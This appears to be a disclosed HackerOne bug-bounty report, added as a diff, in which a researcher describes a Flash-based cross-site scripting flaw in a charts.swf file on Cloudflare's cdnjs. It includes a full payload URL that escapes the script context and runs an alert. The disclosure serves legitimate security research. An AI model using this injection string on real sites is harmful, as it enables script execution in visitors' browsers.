@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/8817
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/smiegles
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.08.2014 16:57:11
+
+Summary:
+
+Hi,
+
+I found another flash based XSS located here :
+http://cdnjs.cloudflare.com/ajax/libs/extjs/3.4.1-1/resources/charts.swf?allowedDomain=\%22})))}catch(e){alert(document.domain);}//
+
+best regards,
+
+Olivier Beg!
